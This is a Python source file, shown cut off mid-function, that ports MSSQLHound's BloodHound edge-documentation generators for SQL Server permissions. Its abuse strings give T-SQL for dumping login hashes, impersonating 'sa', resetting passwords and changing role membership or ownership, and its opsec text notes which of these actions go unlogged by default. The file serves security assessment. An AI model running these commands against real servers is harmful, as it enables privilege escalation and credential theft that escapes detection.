"""Per-edge-kind documentation property generators (port of Go ``edges.go``).

Faithful port of ``MSSQLHound/internal/bloodhound/edges.go`` —
``GetEdgeProperties`` + ``edgePropertyGenerators`` + ``edgeCompositionGenerators``
+ ``IsTraversableEdge``. Each generator takes an :class:`EdgeCtx` (the Python
analogue of Go ``EdgeContext``) and returns the same ``general`` /
``windowsAbuse`` / ``linuxAbuse`` / ``opsec`` / ``references`` strings the Go
templates build by string concatenation. Only the Stage-6 edge kinds (server +
database level) have generators here; the linked-server / credential /
service-account / coercion / Kerberos generators are Stage 7.

The strings are reproduced VERBATIM from the Go source (same spacing, the same
trailing spaces and ``\n`` joins) so BloodHound entity panels render identically.
``GetEdgeProperties`` filters out empty strings exactly like the Go (and the
original PowerShell ``Add-Edge``): a key is only present when its string is
non-empty. ``composition`` is added for the composition-set kinds, and
``withGrant`` is injected by the caller (not here) when the source permission was
``GRANT_WITH_GRANT_OPTION``.

No node-specific casing is changed: ``SourceType`` / ``TargetType`` carry the
literal node-kind strings (``MSSQL_Server``, ``MSSQL_Login``, ``Computer`` ...),
exactly as Go's ``NodeKinds.*`` values flow into ``ctx``.
"""
from __future__ import annotations

import logging
from dataclasses import dataclass, field

from ..graph import MSSQLEdgeProperties
from ..kinds import edges as ek

logger = logging.getLogger(__name__)


@dataclass
class EdgeCtx:
    """Python analogue of Go ``bloodhound.EdgeContext``.

    Mirrors the fields the property/composition generators read. ``source_id`` /
    ``target_id`` / ``sql_server_id`` are the ObjectIdentifiers used to build the
    composition Cypher (upper-cased, backslash-escaped exactly like Go
    ``escapeAndUpper``). The last group of fields is read by the Stage-7b
    (AD/credential/proxy/coercion) generators only.
    """

    source_name: str = ""
    source_type: str = ""
    source_id: str = ""
    target_name: str = ""
    target_type: str = ""
    target_id: str = ""
    target_type_description: str = ""
    sql_server_name: str = ""
    sql_server_id: str = ""
    database_name: str = ""
    permission: str = ""
    is_fixed_role: bool = False
    # Stage-7b fields (Go EdgeContext): the proxy/credential edge generators and
    # the CoerceAndRelay composition read these.
    proxy_name: str = ""           # HasProxyCred abuse text
    credential_identity: str = ""  # HasProxyCred general/opsec text
    subsystems: str = ""           # HasProxyCred general text (comma-joined)
    is_enabled: bool = False       # HasProxyCred opsec (proxy ENABLED/DISABLED)
    security_identifier: str = ""  # CoerceAndRelay composition (coercion-victim Computer SID)


# ---------------------------------------------------------------------------
# Cypher id helpers (Go escapeAndUpper / extractDBID)
# ---------------------------------------------------------------------------
def _esc(object_id: str) -> str:
    """Escape backslashes and upper-case an id for Cypher (Go ``escapeAndUpper``)."""
    return object_id.replace("\\", "\\\\").upper()


def _extract_db_id(object_id: str) -> str:
    """Database id from a compound ``user@dbid`` id (Go ``extractDBID``)."""
    parts = object_id.split("@", 1)
    if len(parts) == 2:
        return parts[1]
    return object_id


# ---------------------------------------------------------------------------
# Shared boilerplate strings reused verbatim across many generators in Go.
# Naming them once keeps the port readable without changing any output text.
# ---------------------------------------------------------------------------
# The trace-log preamble that opens nearly every opsec block.
_TRACE_PREAMBLE = (
    "SQL Server logs certain security-related events to a trace log by default, "
    "but must be configured to forward them to a SIEM. The local log may roll "
    "over frequently on large, active servers, as the default storage size is "
    "only 20 MB. Furthermore, the default trace log is deprecated and may be "
    "removed in future versions to be replaced permanently by Extended Events. \n"
)
# The default-trace reference line, appended to many references blocks.
_REF_DEFAULT_TRACE = (
    "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/"
    "default-trace-enabled-server-configuration-option?view=sql-server-ver17"
)
# The two SQL-tool connection lead-ins (Windows vs Linux phrasing). Many abuse
# blocks open with one of these, sometimes with " as <source>" inserted.
_WIN_TOOLS = (
    "(e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied "
    "Linux tooling such as impacket mssqlclient.py)"
)
_LINUX_TOOLS = (
    "(e.g., using impacket mssqlclient.py or proxied Windows tooling such as "
    "sqlcmd, mssql-cli, or SQL Server Management Studio)"
)
# The role-membership-change trace queries (server-level / database-level).
_SRV_ROLE_TRACE_QUERY = (
    "SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + "
    "RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), "
    "value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE "
    "EventClass = 108 ORDER BY StartTime DESC; "
)
_DB_ROLE_TRACE_QUERY = (
    "SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN "
    "EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass "
    "= 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in "
    "database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT "
    "CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = "
    "2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC; "
)


def _win_lead(ctx: EdgeCtx, with_source: bool = True) -> str:
    """``Connect to the <server> SQL server [as <source>] <win-tools> and ...``."""
    src = f" as {ctx.source_name}" if with_source else ""
    return (
        f"Connect to the {ctx.sql_server_name} SQL server{src} {_WIN_TOOLS} and "
        "execute the following SQL statement:\n"
    )


def _linux_lead(ctx: EdgeCtx, with_source: bool = True) -> str:
    src = f" as {ctx.source_name}" if with_source else ""
    return (
        f"Connect to the {ctx.sql_server_name} SQL server{src} {_LINUX_TOOLS} and "
        "execute the following SQL statement:\n"
    )


# ---------------------------------------------------------------------------
# Generators (one per Stage-6 edge kind). Each returns a 5-tuple
# (general, windowsAbuse, linuxAbuse, opsec, references); empties are filtered by
# build_edge_properties.
# ---------------------------------------------------------------------------
def _gen_member_of(ctx: EdgeCtx):
    opsec = (
        "Role membership is a static relationship. Actions performed using role "
        "permissions are logged based on the specific operation, not the role "
        "membership itself. \n"
        "To view current role memberships at server level: \n"
        "SELECT \n"
        "    r.name AS RoleName,\n"
        "    m.name AS MemberName\n"
        "FROM sys.server_role_members rm\n"
        "JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id\n"
        "JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id\n"
        "ORDER BY r.name, m.name; \n"
        "To view current role memberships at database level: \n"
        "SELECT \n"
        "    r.name AS RoleName,\n"
        "    m.name AS MemberName\n"
        "FROM sys.database_role_members rm\n"
        "JOIN sys.database_principals r ON rm.role_principal_id = r.principal_id\n"
        "JOIN sys.database_principals m ON rm.member_principal_id = m.principal_id\n"
        "ORDER BY r.name, m.name; "
    )
    refs = (
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-role-members-transact-sql?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql?view=sql-server-ver17"
    )
    return (
        f"The {ctx.source_type} is a member of the {ctx.target_type}. This "
        "membership grants all permissions associated with the target role to the "
        "source principal.",
        f"When connected to the server/database as {ctx.source_name}, you have all "
        f"permissions granted to the {ctx.target_name} role.",
        f"When connected to the server/database as {ctx.source_name}, you have all "
        f"permissions granted to the {ctx.target_name} role.",
        opsec,
        refs,
    )


def _gen_is_mapped_to(ctx: EdgeCtx):
    return (
        f"The server login {ctx.source_name} is mapped to the {ctx.database_name} "
        f"database user {ctx.target_name}.",
        f"Connect as the login and use the database: USE {ctx.database_name}; ",
        f"Connect as the login and use the database: USE {ctx.database_name}; ",
        "This is a static mapping. Actions are logged based on what the database "
        "user does.",
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/create-a-database-user?view=sql-server-ver17",
    )


def _gen_contains(ctx: EdgeCtx):
    return (
        f"The {ctx.source_type} contains the {ctx.target_type}. This is a "
        "structural relationship showing that the target exists within the scope "
        "of the source.",
        f"This is a structural relationship and cannot be directly abused. Control "
        f"of {ctx.source_type} implies control of {ctx.target_type}.",
        f"This is a structural relationship and cannot be directly abused. Control "
        f"of {ctx.source_type} implies control of {ctx.target_type}.",
        "",
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/principals-database-engine?view=sql-server-ver17",
    )


def _gen_owns(ctx: EdgeCtx):
    win = lin = ""
    if ctx.target_type == "MSSQL_Database":
        win = (
            f"As the database owner, connect to the {ctx.sql_server_name} SQL "
            "server and execute:\n"
            f"USE {ctx.target_name}; \n"
            "-- You have db_owner privileges in this database \n"
            "-- Add users, grant permissions, modify objects, etc. \n"
            "-- Examples: \n"
            "CREATE USER [NewUser] FOR LOGIN [SomeLogin]; \n"
            "EXEC sp_addrolemember 'db_datareader', 'NewUser'; \n"
            "GRANT CONTROL TO [SomeUser]; "
        )
        lin = win
    elif ctx.target_type == "MSSQL_ServerRole":
        win = (
            f"As the server role owner, connect to the {ctx.sql_server_name} SQL "
            "server and execute:\n"
            "-- Add members to the owned role \n"
            f"EXEC sp_addsrvrolemember 'target_login', '{ctx.target_name}'; \n"
            "-- Change role name \n"
            f"ALTER SERVER ROLE [{ctx.target_name}] WITH NAME = [NewName]; \n"
            "-- Transfer ownership \n"
            f"ALTER AUTHORIZATION ON SERVER ROLE::[{ctx.target_name}] TO [another_login]; "
        )
        lin = win
    elif ctx.target_type == "MSSQL_DatabaseRole":
        win = (
            f"As the database role owner, connect to the {ctx.sql_server_name} SQL "
            "server and execute:\n"
            f"USE {ctx.database_name}; \n"
            "-- Add members to the owned role \n"
            f"EXEC sp_addrolemember '{ctx.target_name}', 'target_user'; \n"
            "-- Change role name \n"
            f"ALTER ROLE [{ctx.target_name}] WITH NAME = [NewName]; \n"
            "-- Transfer ownership \n"
            f"ALTER AUTHORIZATION ON ROLE::[{ctx.target_name}] TO [another_user]; "
        )
        lin = win
    refs = (
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addsrvrolemember-transact-sql?view=sql-server-ver17"
    )
    return (
        f"The {ctx.source_type} owns the {ctx.target_type}. Ownership provides full "
        "control over the object, including the ability to grant permissions, "
        "change properties, and in most cases, impersonate or control access.",
        win,
        lin,
        "Ownership relationships are static and actions taken as an owner are "
        "typically logged based on the specific action performed. Role membership "
        "changes are logged by default, but ownership transfers and role property "
        "changes may not be logged.",
        refs,
    )


def _gen_control_server(ctx: EdgeCtx):
    refs = (
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#sql-server-permissions \n"
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n"
        f"{_REF_DEFAULT_TRACE}"
    )
    return (
        "The CONTROL SERVER permission on a server allows the source "
        f"{ctx.source_type} to conduct any action in the instance of SQL Server "
        "that is not explicitly denied. An exception is for members of the sysadmin "
        "server role, in which case explicit denies are ignored.",
        f"Connect to the {ctx.sql_server_name} SQL server {_WIN_TOOLS} and execute "
        "the following SQL statement:\n"
        "SELECT * FROM sys.sql_logins; -- dump hashes ",
        f"Connect to the {ctx.sql_server_name} SQL server {_LINUX_TOOLS} and execute "
        "the following SQL statement:\n"
        "SELECT * FROM sys.sql_logins; -- dump hashes ",
        _TRACE_PREAMBLE + "Log event generation is dependent on the action performed.",
        refs,
    )


def _gen_control_db(ctx: EdgeCtx):
    win = (
        f"{_win_lead(ctx)}"
        f"USE {ctx.target_name}; \n"
        "Impersonate user: EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT; \n"
        "Add member to role: EXEC sp_addrolemember 'role_name', 'user_name'; \n"
        "Change role owner: ALTER AUTHORIZATION ON ROLE::[role_name] TO [user_name]; \n"
        "Change app role password: WARNING: DO NOT execute this attack, as it will "
        "immediately break the application that relies on this application role to "
        "access this database and WILL cause an outage."
    )
    lin = (
        f"{_linux_lead(ctx)}"
        f"USE {ctx.target_name}; \n"
        "Impersonate user: EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT; \n"
        "Add member to role: EXEC sp_addrolemember 'role_name', 'user_name'; \n"
        "Change role owner: ALTER AUTHORIZATION ON ROLE::[role_name] TO [user_name]; \n"
        "Change app role password: WARNING: DO NOT execute this attack, as it will "
        "immediately break the application that relies on this application role to "
        "access this database and WILL cause an outage."
    )
    opsec = (
        _TRACE_PREAMBLE
        + "Log events are not generated for user impersonation, role ownership "
        "changes, or application role password changes by default. Log events are "
        "generated by default for additions to database role membership. \n"
        "To view database role membership change logs, execute: \n"
        + _DB_ROLE_TRACE_QUERY
    )
    refs = (
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n"
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-application-role-transact-sql?view=sql-server-ver17 \n"
        f"{_REF_DEFAULT_TRACE}"
    )
    return (
        "The CONTROL permission on a database grants the source "
        f"{ctx.source_type} all defined permissions on the database and its "
        "descendent objects. This includes the ability to impersonate any database "
        "user, add members to any role, change ownership of objects, and execute "
        "any action within the database. WARNING: This includes the ability to "
        "change application role passwords, which will break applications using "
        "those roles and cause an outage.",
        win,
        lin,
        opsec,
        refs,
    )


_IMPERSONATE_REFS = (
    "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n"
    "- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n"
    f"{_REF_DEFAULT_TRACE}"
)


def _gen_impersonate(ctx: EdgeCtx):
    if ctx.database_name != "":
        win = (
            f"{_win_lead(ctx)}"
            f"USE {ctx.database_name}; \n"
            f"EXECUTE AS USER = '{ctx.target_name}' \n"
            "   SELECT USER_NAME() \n"
            "REVERT "
        )
        lin = (
            f"{_linux_lead(ctx)}"
            f"USE {ctx.database_name}; \n"
            f"EXECUTE AS USER = '{ctx.target_name}' \n"
            "   SELECT USER_NAME() \n"
            "REVERT "
        )
        opsec = _TRACE_PREAMBLE + "Log events are not generated for user impersonation by default."
    else:
        win = (
            f"{_win_lead(ctx)}"
            f"EXECUTE AS LOGIN = '{ctx.target_name}' \n"
            "   SELECT SUSER_NAME() \n"
            "REVERT "
        )
        lin = (
            f"{_linux_lead(ctx)}"
            f"EXECUTE AS LOGIN = '{ctx.target_name}' \n"
            "   SELECT SUSER_NAME() \n"
            "REVERT "
        )
        opsec = _TRACE_PREAMBLE + "Log events are not generated for login impersonation by default."
    return (
        "The IMPERSONATE permission on a securable object effectively grants the "
        f"source {ctx.source_type} the ability to impersonate the target object.",
        win,
        lin,
        opsec,
        _IMPERSONATE_REFS,
    )


def _gen_impersonate_any_login(ctx: EdgeCtx):
    win = (
        f"Connect to the {ctx.sql_server_name} SQL server as {ctx.source_name} "
        f"{_WIN_TOOLS} and execute the following SQL statement:\n"
        "EXECUTE AS LOGIN = 'sa' \n"
        "   -- Now executing with sa privileges \n"
        "   SELECT SUSER_NAME() \n"
        "   -- Perform privileged actions here \n"
        "REVERT "
    )
    lin = (
        f"Connect to the {ctx.sql_server_name} SQL server as {ctx.source_name} "
        f"{_LINUX_TOOLS} and execute the following SQL statement:\n"
        "EXECUTE AS LOGIN = 'sa' \n"
        "   -- Now executing with sa privileges \n"
        "   SELECT SUSER_NAME() \n"
        "   -- Perform privileged actions here \n"
        "REVERT "
    )
    return (
        "The IMPERSONATE ANY LOGIN permission on the server object effectively "
        f"grants the source {ctx.source_type} the ability to impersonate any server "
        "login.",
        win,
        lin,
        _TRACE_PREAMBLE + "Log events are not generated for login impersonation by default.",
        _IMPERSONATE_REFS,
    )


def _gen_change_password(ctx: EdgeCtx):
    if ctx.target_type_description == "APPLICATION_ROLE":
        general = (
            "WARNING: DO NOT execute this attack, as it will immediately break the "
            "application that relies on this application role to access this "
            "database and WILL cause an outage. The ALTER ANY APPLICATION ROLE "
            f"permission on a database allows the source {ctx.source_type} to "
            "change the password for an application role, activate the application "
            "role with the new password, and execute actions with the application "
            "role's permissions."
        )
        refs = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/application-roles?view=sql-server-ver17"
        return general, general, general, general, refs
    general = f"The source {ctx.source_type} can change the password for this {ctx.target_type}."
    win = (
        f"Connect to the {ctx.sql_server_name} SQL server {_WIN_TOOLS} and execute "
        "the following SQL statement:\n"
        f"ALTER LOGIN [{ctx.target_name}] WITH PASSWORD = 'password'; "
    )
    lin = (
        f"Connect to the {ctx.sql_server_name} SQL server {_LINUX_TOOLS} and execute "
        "the following SQL statement:\n"
        f"ALTER LOGIN [{ctx.target_name}] WITH PASSWORD = 'password'; "
    )
    opsec = _TRACE_PREAMBLE + "Log events are not generated for password changes by default."
    refs = (
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-login-transact-sql?view=sql-server-ver17 \n"
        f"{_REF_DEFAULT_TRACE}"
    )
    return general, win, lin, opsec, refs


_ADD_MEMBER_REFS_SERVER = (
    "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addsrvrolemember-transact-sql?view=sql-server-ver17 \n"
    f"{_REF_DEFAULT_TRACE} \n"
    "- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
)
_ADD_MEMBER_REFS_DB = (
    "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 \n"
    f"{_REF_DEFAULT_TRACE} \n"
    "- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
)


def _gen_add_member(ctx: EdgeCtx):
    if ctx.target_type_description == "SERVER_ROLE":
        win = (
            f"{_win_lead(ctx)}"
            f"EXEC sp_addsrvrolemember 'login_name', '{ctx.target_name}';"
        )
        lin = (
            f"{_linux_lead(ctx)}"
            f"EXEC sp_addsrvrolemember 'login_name', '{ctx.target_name}';"
        )
        opsec = (
            _TRACE_PREAMBLE
            + "Log events are generated by default for additions to role membership. \n"
            "To view role membership change logs, execute: \n"
            + _SRV_ROLE_TRACE_QUERY.rstrip()  # server variant ends without trailing space in AddMember
        )
        refs = _ADD_MEMBER_REFS_SERVER
    else:
        win = (
            f"{_win_lead(ctx)}"
            f"EXEC sp_addrolemember '{ctx.target_name}', 'user_name';"
        )
        lin = (
            f"{_linux_lead(ctx)}"
            f"EXEC sp_addrolemember '{ctx.target_name}', 'user_name';"
        )
        opsec = (
            _TRACE_PREAMBLE
            + "Log events are generated by default for additions to role membership. \n"
            "To view role membership change logs, execute: \n"
            + _DB_ROLE_TRACE_QUERY.rstrip()
        )
        refs = _ADD_MEMBER_REFS_DB
    return (
        f"The source {ctx.source_type} can add members to this {ctx.target_type}, "
        "granting the new member the permissions assigned to the role.",
        win,
        lin,
        opsec,
        refs,
    )


_ALTER_REFS = (
    "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n"
    "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql?view=sql-server-ver17 \n"
    "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17 \n"
    f"{_REF_DEFAULT_TRACE}"
)


def _gen_alter(ctx: EdgeCtx):
    win = lin = opsec = ""
    if ctx.database_name != "":
        if ctx.target_type_description == "DATABASE_ROLE":
            win = (
                f"{_win_lead(ctx)}"
                f"USE {ctx.database_name}; \n"
                f"Add member: EXEC sp_addrolemember '{ctx.target_name}', 'user_name'; "
            )
            lin = (
                f"{_linux_lead(ctx)}"
                f"USE {ctx.database_name}; \n"
                f"Add member: EXEC sp_addrolemember '{ctx.target_name}', 'user_name'; "
            )
            opsec = (
                _TRACE_PREAMBLE
                + "Log events are generated by default for additions to database "
                "role membership. \n"
                "To view database role membership change logs, execute: \n"
                + _DB_ROLE_TRACE_QUERY
            )
        elif ctx.target_type_description == "DATABASE":
            win = (
                f"{_win_lead(ctx)}"
                f"USE {ctx.target_name}; \n"
                "Add member to any user-defined role: EXEC sp_addrolemember "
                "'role_name', 'user_name'; \n"
                "Note: ALTER on database grants effective permissions ALTER ANY "
                "ROLE and ALTER ANY APPLICATION ROLE."
            )
            lin = (
                f"{_linux_lead(ctx)}"
                f"USE {ctx.target_name}; \n"
                "Add member to any user-defined role: EXEC sp_addrolemember "
                "'role_name', 'user_name'; \n"
                "Note: ALTER on database grants effective permissions ALTER ANY "
                "ROLE and ALTER ANY APPLICATION ROLE."
            )
            opsec = (
                _TRACE_PREAMBLE
                + "Log events are generated by default for additions to database "
                "role membership when ALTER DATABASE permission is used to add "
                "members to roles."
            )
    else:
        if ctx.target_type_description == "SERVER_ROLE":
            win = (
                f"{_win_lead(ctx)}"
                f"Add member: EXEC sp_addsrvrolemember 'login_name', '{ctx.target_name}'; "
            )
            lin = (
                f"{_linux_lead(ctx)}"
                f"Add member: EXEC sp_addsrvrolemember 'login_name', '{ctx.target_name}'; "
            )
            opsec = (
                _TRACE_PREAMBLE
                + "Log events are generated by default for additions to server "
                "role membership. \n"
                "To view server role membership change logs, execute: \n"
                + _SRV_ROLE_TRACE_QUERY
            )
    return (
        "The ALTER permission on a securable object allows the source "
        f"{ctx.source_type} to change properties, except ownership, of a particular "
        "securable object.",
        win,
        lin,
        opsec,
        _ALTER_REFS,
    )


_CONTROL_REFS = (
    "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n"
    "- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n"
    "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 \n"
    f"{_REF_DEFAULT_TRACE}"
)

_DB_USER_TYPES = {
    "WINDOWS_USER", "WINDOWS_GROUP", "SQL_USER", "ASYMMETRIC_KEY_MAPPED_USER",
    "CERTIFICATE_MAPPED_USER",
}
_LOGIN_TYPES = {
    "WINDOWS_LOGIN", "WINDOWS_GROUP", "SQL_LOGIN", "ASYMMETRIC_KEY_MAPPED_LOGIN",
    "CERTIFICATE_MAPPED_LOGIN",
}


def _gen_control(ctx: EdgeCtx):
    win = lin = opsec = ""
    is_db_user = ctx.target_type_description in _DB_USER_TYPES
    is_login = ctx.target_type_description in _LOGIN_TYPES
    if ctx.database_name != "":
        if is_db_user:
            win = (
                f"{_win_lead(ctx)}"
                f"USE {ctx.database_name}; \n"
                f"EXECUTE AS USER = '{ctx.target_name}' \n"
                "   SELECT USER_NAME() \n"
                "REVERT "
            )
            lin = (
                f"{_linux_lead(ctx)}"
                f"USE {ctx.database_name}; \n"
                f"EXECUTE AS USER = '{ctx.target_name}' \n"
                "   SELECT USER_NAME() \n"
                "REVERT "
            )
            opsec = _TRACE_PREAMBLE + "Log events are not generated for user impersonation by default."
        elif ctx.target_type_description == "DATABASE_ROLE":
            win = (
                f"{_win_lead(ctx)}"
                f"USE {ctx.database_name}; \n"
                f"Add member: EXEC sp_addrolemember '{ctx.target_name}', 'user_name'; \n"
                f"Change owner: ALTER AUTHORIZATION ON ROLE::[{ctx.target_name}] TO [user_name]; "
            )
            lin = (
                f"{_linux_lead(ctx)}"
                f"USE {ctx.database_name}; \n"
                f"Add member: EXEC sp_addrolemember '{ctx.target_name}', 'user_name'; \n"
                f"Change owner: ALTER AUTHORIZATION ON ROLE::[{ctx.target_name}] TO [user_name]; "
            )
            opsec = (
                _TRACE_PREAMBLE
                + "Log events are generated by default for additions to database "
                "role membership. Role ownership changes are not logged by default. \n"
                "To view database role membership change logs, execute: \n"
                + _DB_ROLE_TRACE_QUERY
            )
        elif ctx.target_type_description == "DATABASE":
            win = (
                f"{_win_lead(ctx)}"
                f"USE {ctx.target_name}; \n"
                "Impersonate user: EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT; \n"
                "Add member to role: EXEC sp_addrolemember 'role_name', 'user_name'; \n"
                "Change owner: ALTER AUTHORIZATION ON ROLE::[role] TO [user_name]; "
            )
            lin = (
                f"{_linux_lead(ctx)}"
                f"USE {ctx.target_name}; \n"
                "Impersonate user: EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT; \n"
                "Add member to role: EXEC sp_addrolemember 'role_name', 'user_name'; \n"
                "Change owner: ALTER AUTHORIZATION ON ROLE::[role] TO [user_name]; "
            )
            opsec = (
                _TRACE_PREAMBLE
                + "Log events are not generated for user impersonation or role "
                "ownership changes by default. Log events are generated by default "
                "for additions to database role membership. "
                "To view database role membership change logs, execute: \n"
                + _DB_ROLE_TRACE_QUERY
            )
    else:
        if is_login:
            win = (
                f"{_win_lead(ctx)}"
                f"EXECUTE AS LOGIN = '{ctx.target_name}' \n"
                "   SELECT SUSER_NAME() \n"
                "REVERT "
            )
            lin = (
                f"{_linux_lead(ctx)}"
                f"EXECUTE AS LOGIN = '{ctx.target_name}' \n"
                "   SELECT SUSER_NAME() \n"
                "REVERT "
            )
            opsec = _TRACE_PREAMBLE + "Log events are not generated for login impersonation by default."
        elif ctx.target_type_description == "SERVER_ROLE":
            win = (
                f"{_win_lead(ctx)}"
                f"Add member: EXEC sp_addsrvrolemember 'login_name', '{ctx.target_name}'; \n"
                f"Change owner: ALTER AUTHORIZATION ON SERVER ROLE::[{ctx.target_name}] TO [login_name]; "
            )
            lin = (
                f"{_linux_lead(ctx)}"
                f"Add member: EXEC sp_addsrvrolemember 'login_name', '{ctx.target_name}'; \n"
                f"Change owner: ALTER AUTHORIZATION ON SERVER ROLE::[{ctx.target_name}] TO [login_name]; "
            )
            opsec = (
                _TRACE_PREAMBLE
                + "Log events are generated by default for additions to server "
                "role membership. Server role ownership changes are not logged by "
                "default. \n"
                "To view server role membership change logs, execute: \n"
                + _SRV_ROLE_TRACE_QUERY
            )
    return (
        "The CONTROL permission on a securable object effectively grants the source "
        f"{ctx.source_type} all defined permissions on the securable object and its "
        "descendent objects. CONTROL at a particular scope includes CONTROL on all "
        "securable objects under that scope (e.g., CONTROL on a database includes "
        "control of all permissions on the database as well as all permissions on "
        "all assemblies, schemas, and other objects within all schemas in the "
        "database).",
        win,
        lin,
        opsec,
        _CONTROL_REFS,
    )


_CHANGE_OWNER_REFS = (
    "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions \n"
    f"{_REF_DEFAULT_TRACE} \n"
    "- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
)


def _gen_change_owner(ctx: EdgeCtx):
    win = lin = ""
    if ctx.target_type_description == "SERVER_ROLE":
        win = (
            f"{_win_lead(ctx)}"
            f"ALTER AUTHORIZATION ON SERVER ROLE::[{ctx.target_name}] TO [login]; "
        )
        lin = (
            f"{_linux_lead(ctx)}"
            f"ALTER AUTHORIZATION ON SERVER ROLE::[{ctx.target_name}] TO [login]; "
        )
    elif ctx.target_type_description == "DATABASE_ROLE":
        win = (
            f"{_win_lead(ctx)}"
            f"ALTER AUTHORIZATION ON ROLE::[{ctx.target_name}] TO [user]; "
        )
        lin = (
            f"{_linux_lead(ctx)}"
            f"ALTER AUTHORIZATION ON ROLE::[{ctx.target_name}] TO [user]; "
        )
    return (
        f"The source {ctx.source_type} can change the owner of this "
        f"{ctx.target_type} or descendent objects in its scope.",
        win,
        lin,
        _TRACE_PREAMBLE + "Role ownership changes are not logged by default.",
        _CHANGE_OWNER_REFS,
    )


def _gen_alter_any_login(ctx: EdgeCtx):
    return (
        "The ALTER ANY LOGIN permission on a server allows the source "
        f"{ctx.source_type} to change the password for any SQL login (as opposed to "
        "Windows login) that is not the fixed sa account. If the target has "
        "sysadmin or CONTROL SERVER, the principal making the change must also have "
        "sysadmin or CONTROL SERVER.",
        f"Connect to the {ctx.sql_server_name} SQL server {_WIN_TOOLS} and execute "
        "the following SQL statement:\n"
        "ALTER LOGIN [login] WITH PASSWORD = 'password'; ",
        f"Connect to the {ctx.sql_server_name} SQL server {_LINUX_TOOLS} and execute "
        "the following SQL statement:\n"
        "ALTER LOGIN [login] WITH PASSWORD = 'password'; ",
        _TRACE_PREAMBLE + "Log events are not generated for password changes by default.",
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-login-transact-sql?view=sql-server-ver17 \n"
        f"{_REF_DEFAULT_TRACE}",
    )


def _gen_alter_any_server_role(ctx: EdgeCtx):
    opsec = (
        _TRACE_PREAMBLE
        + "Log events are generated by default for additions to server role "
        "membership. \n"
        "To view server role membership change logs, execute: \n"
        + _SRV_ROLE_TRACE_QUERY
    )
    return (
        "The ALTER ANY SERVER ROLE permission allows the source "
        f"{ctx.source_type} to add members to any user-defined server role as well "
        f"as add members to fixed server roles that the source {ctx.source_type} is "
        "a member of.",
        f"Connect to the {ctx.sql_server_name} SQL server {_WIN_TOOLS} and execute "
        "the following SQL statement:\n"
        "EXEC sp_addsrvrolemember @loginame = 'login', @rolename = 'role' ",
        f"Connect to the {ctx.sql_server_name} SQL server {_LINUX_TOOLS} and execute "
        "the following SQL statement:\n"
        "EXEC sp_addsrvrolemember @loginame = 'login', @rolename = 'role' ",
        opsec,
        _CHANGE_OWNER_REFS,
